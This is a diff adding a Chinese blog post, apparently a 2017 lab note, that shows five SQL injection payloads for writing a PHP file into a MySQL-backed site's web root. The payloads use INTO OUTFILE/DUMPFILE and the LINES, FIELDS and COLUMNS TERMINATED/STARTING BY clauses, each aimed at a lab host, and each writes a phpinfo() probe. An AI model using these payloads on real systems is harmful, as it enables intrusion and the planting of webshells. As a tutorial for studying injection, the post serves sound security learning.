@@ -1,0 +1,51 @@
+<!DOCTYPE html><html lang="zh-CN"><head><meta charset="utf-8"><meta name="X-UA-Compatible" content="IE=edge"><meta name="author" content="Manning23"><title>MYSQL存在注入点，写WebShell的5种方式 · Manning23</title><meta name="description" content="很久没更新了，分享一个2017年的笔记。
+0x00 写数据前提1，在mysql的配置文件 my.ini 中，secure_file_priv=&amp;quot;c:/wamp64/tmp&amp;quot; 被注释 或者 `secure_file_priv 配置的位置是web目录。
+2，未开启全局gpc。
+0x0"><meta name="keywords"><meta content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" name="viewport"><meta content="yes" name="apple-mobile-web-app-capable"><meta content="black" name="apple-mobile-web-app-status-bar-style"><meta content="telephone=no" name="format-detection"><meta name="renderer" content="webkit"><link rel="short icon" href="/images/favicon.png" type="image/x-icon"><link rel="stylesheet" href="/css/style.css"><link rel="stylesheet" href="/css/blog_basic.css"><link rel="stylesheet" href="/css/font-awesome.min.css"><link rel="alternate" type="application/atom+xml" title="ATOM 1.0" href="/atom.xml"></head><body><div class="sidebar animated fadeInDown"><div class="logo-title"><div class="title"><img src="/images/logo@2x.png" style="width:127px;"><h3 title=""><a href="/">Manning23</a></h3><div class="description"><p>Technology &amp; Life</p></div></div></div><ul class="social-links"><li><a href="http://weibo.com/2077484845"><i class="fa fa-weibo"></i></a></li></ul><div class="footer"><a target="_blank" href="/"><span>Theme by </span></a><a href="https://www.caicai.me"> CaiCai </a><span>&</span><a href="https://github.com/Ben02/hexo-theme-Anatole"> Ben</a><div class="by_farbox"><a href="https://hexo.io/zh-cn/" target="_blank">Proudly published with Hexo&#65281;</a></div></div></div><div class="main"><div class="page-top animated fadeInDown"><div class="nav"><li><a href="/">首页</a></li><li><a href="/about">关于</a></li><li><a href="/archives">归档</a></li></div><div class="information"><div class="back_btn"><li><a onclick="window.history.go(-1)" class="fa fa-chevron-left"> </a></li></div><div class="avatar"><img src="/images/avatar.png"></div></div></div><div class="autopagerize_page_element"><div class="content"><div class="post-page"><div class="post animated fadeInDown"><div class="post-title"><h3><a>MYSQL存在注入点，写WebShell的5种方式</a></h3></div><div class="post-content"><p>很久没更新了，分享一个2017年的笔记。</p>
+<h2 id="0x00-写数据前提"><a href="#0x00-写数据前提" class="headerlink" title="0x00 写数据前提"></a>0x00 写数据前提</h2><p>1，在mysql的配置文件 my.ini 中，<code>secure_file_priv=&quot;c:/wamp64/tmp&quot;</code> 被注释 或者 <code>`secure_file_priv</code> 配置的位置是web目录。</p>
+<p>2，未开启全局gpc。</p>
+<h2 id="0x01-环境准备"><a href="#0x01-环境准备" class="headerlink" title="0x01 环境准备"></a>0x01 环境准备</h2><h3 id="测试语句"><a href="#测试语句" class="headerlink" title="测试语句"></a>测试语句</h3><pre><code>http://172.16.55.130/work/sqli-1.php?id=1
+</code></pre><h3 id="页面显示效果"><a href="#页面显示效果" class="headerlink" title="页面显示效果"></a>页面显示效果</h3><p><img src="/2019/07/23/MYSQL存在注入点，写WebShell的5种方式/1.png" width="70%"><br>​   </p>
+<h2 id="0x02-union-select-后写入"><a href="#0x02-union-select-后写入" class="headerlink" title="0x02 union select 后写入"></a>0x02 union select 后写入</h2><pre><code>最常见的写入方式，union select 后跟 into outfile 语句
+
+http://172.16.55.130/work/sqli-1.php?id=@ union select 1,2,3,4,&apos;&lt;?php phpinfo() ?&gt;&apos; into outfile &apos;C:/wamp64/www/work/webshell.php&apos;
+
+http://172.16.55.130/work/sqli-1.php?id=@ union select 1,2,3,4,&apos;&lt;?php phpinfo() ?&gt;&apos; into dumpfile &apos;C:/wamp64/www/work/webshell.php&apos;
+
+PS: 在windows下，位置的分隔符为 /（斜杠）。
+</code></pre><h2 id="0x03-lines-terminated-by-写入"><a href="#0x03-lines-terminated-by-写入" class="headerlink" title="0x03 lines terminated by 写入"></a>0x03 lines terminated by 写入</h2><p><strong>注入点语句</strong></p>
+<pre><code>http://172.16.55.130/work/sqli-1.php?id=1 into outfile &apos;C:/wamp64/www/work/webshell.php&apos; lines terminated by &apos;&lt;?php phpinfo() ?&gt;&apos;;
+
+http://172.16.55.130/work/sqli-1.php?id=1 limit 1 into outfile &apos;C:/wamp64/www/work/webshell.php&apos; lines terminated by &apos;&lt;?php phpinfo() ?&gt;&apos;;
+</code></pre><p><strong>执行语句后，页面显示内容</strong></p>
+<p><img src="/2019/07/23/MYSQL存在注入点，写WebShell的5种方式/2.png" width="90%"></p>
+<p><strong>完整的Sql语句</strong></p>
+<pre><code>select * from phpcmsv9.v9_admin_role where roleid = 1 into outfile &apos;C:/wamp64/www/work/webshell.php&apos; lines terminated by &apos;&lt;?php phpinfo() ?&gt;&apos;;
+</code></pre><p><strong>Webshell显示</strong></p>
+<p><img src="/2019/07/23/MYSQL存在注入点，写WebShell的5种方式/3.png" width="100%"></p>
+<p><strong>注入原理</strong></p>
+<p>通过select语句查询的内容写入文件，也就是 <code>1 into outfile &#39;C:/wamp64/www/work/webshell.php&#39;</code> 这样写的原因，然后利用 <code>lines terminated by</code> 语句拼接webshell的内容。<code>lines terminated by</code> 可以理解为 <strong>以每行终止的位置添加 xx 内容</strong>。</p>
+<h2 id="0x04-lines-starting-by-写入"><a href="#0x04-lines-starting-by-写入" class="headerlink" title="0x04 lines starting by 写入"></a>0x04 lines starting by 写入</h2><p><strong>注入点语句</strong></p>
+<pre><code>http://172.16.55.130/work/sqli-1.php?id=1 into outfile &apos;C:/wamp64/www/work/webshell.php&apos; lines starting by &apos;&lt;?php phpinfo() ?&gt;&apos;;
+
+http://172.16.55.130/work/sqli-1.php?id=1 limit 1 into outfile &apos;C:/wamp64/www/work/webshell.php&apos; lines starting by &apos;&lt;?php phpinfo() ?&gt;&apos;;
+</code></pre><p><strong>注入原理</strong></p>
+<p>利用 <code>lines starting by</code> 语句拼接webshell的内容。<code>lines starting by</code> 可以理解为 <strong>以每行开始的位置添加 xx 内容</strong>。</p>
+<h2 id="0x05-fields-terminated-by-写入"><a href="#0x05-fields-terminated-by-写入" class="headerlink" title="0x05 fields terminated by 写入"></a>0x05 fields terminated by 写入</h2><p><strong>注入点语句</strong></p>
+<pre><code>http://172.16.55.130/work/sqli-1.php?id=1 into outfile &apos;C:/wamp64/www/work/webshell.php&apos; fields terminated by &apos;&lt;?php phpinfo() ?&gt;&apos;;
+
+http://172.16.55.130/work/sqli-1.php?id=1 limit 1 into outfile &apos;C:/wamp64/www/work/webshell.php&apos; fields terminated by &apos;&lt;?php phpinfo() ?&gt;&apos;;
+</code></pre><p><strong>注入原理</strong></p>
+<p>利用 <code>fields terminated by</code> 语句拼接webshell的内容。<code>fields terminated by</code> 可以理解为 <strong>以每个字段的位置添加 xx 内容</strong>。</p>
+<h2 id="0x06-COLUMNS-terminated-by-写入"><a href="#0x06-COLUMNS-terminated-by-写入" class="headerlink" title="0x06 COLUMNS terminated by 写入"></a>0x06 COLUMNS terminated by 写入</h2><p><strong>注入点语句</strong></p>
+<pre><code>http://172.16.55.130/work/sqli-1.php?id=1 into outfile &apos;C:/wamp64/www/work/webshell.php&apos; COLUMNS terminated by &apos;&lt;?php phpinfo() ?&gt;&apos;;
+
+http://172.16.55.130/work/sqli-1.php?id=1 limit 1 into outfile &apos;C:/wamp64/www/work/webshell.php&apos; COLUMNS terminated by &apos;&lt;?php phpinfo() ?&gt;&apos;;
+</code></pre><p><strong>注入原理</strong></p>
+<p>利用 <code>fields terminated by</code> 语句拼接webshell的内容。<code>fields terminated by</code> 可以理解为 <strong>以每个字段的位置添加 xx 内容</strong>。</p>
+<h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><ul>
+<li><a href="http://0x007.blog.51cto.com/6330498/1608359/" target="_blank" rel="external">过滤union select 写webshell </a></li>
+<li><a href="https://dev.mysql.com/doc/refman/5.7/en/load-data.html" target="_blank" rel="external">LOAD DATA INFILE Syntax</a></li>
+<li><a href="https://dev.mysql.com/doc/refman/5.7/en/select-into.html" target="_blank" rel="external">SELECT … INTO Syntax</a> </li>
+</ul>
+</div><div class="post-footer"><div class="meta"><div class="info"><i class="fa fa-sun-o"></i><span class="date">2019-07-23</span><i class="fa fa-tag"></i></div></div></div></div><div class="share"><div class="evernote"><a href="javascript:(function(){EN_CLIP_HOST='http://www.evernote.com';try{var%20x=document.createElement('SCRIPT');x.type='text/javascript';x.src=EN_CLIP_HOST+'/public/bookmarkClipper.js?'+(new%20Date().getTime()/100000);document.getElementsByTagName('head')[0].appendChild(x);}catch(e){location.href=EN_CLIP_HOST+'/clip.action?url='+encodeURIComponent(location.href)+'&amp;title='+encodeURIComponent(document.title);}})();" ref="nofollow" target="_blank" class="fa fa-bookmark"></a></div><div class="weibo"><a href="javascript:void((function(s,d,e){try{}catch(e){}var f='http://service.weibo.com/share/share.php?',u=d.location.href,p=['url=',e(u),'&amp;title=',e(d.title),'&amp;appkey=2924220432'].join('');function a(){if(!window.open([f,p].join(''),'mb',['toolbar=0,status=0,resizable=1,width=620,height=450,left=',(s.width-620)/2,',top=',(s.height-450)/2].join('')))u.href=[f,p].join('');};if(/Firefox/.test(navigator.userAgent)){setTimeout(a,0)}else{a()}})(screen,document,encodeURIComponent));" class="fa fa-weibo"></a></div><div class="twitter"><a href="http://twitter.com/home?status=,http://yoursite.com/2019/07/23/MYSQL存在注入点，写WebShell的5种方式/,Manning23,MYSQL存在注入点，写WebShell的5种方式,;" class="fa fa-twitter"></a></div></div><div class="pagination"><ul class="clearfix"><li class="next pagbuttons"><a role="navigation" href="/2018/10/12/利用机器学习和规则实现弱口令检测/" title="利用机器学习和规则实现弱口令检测" class="btn">下一篇</a></li></ul></div></div></div></div></div><script src="/js/jquery.js"></script><script src="/js/jquery-migrate-1.2.1.min.js"></script><script src="/js/jquery.appear.js"></script></body></html>
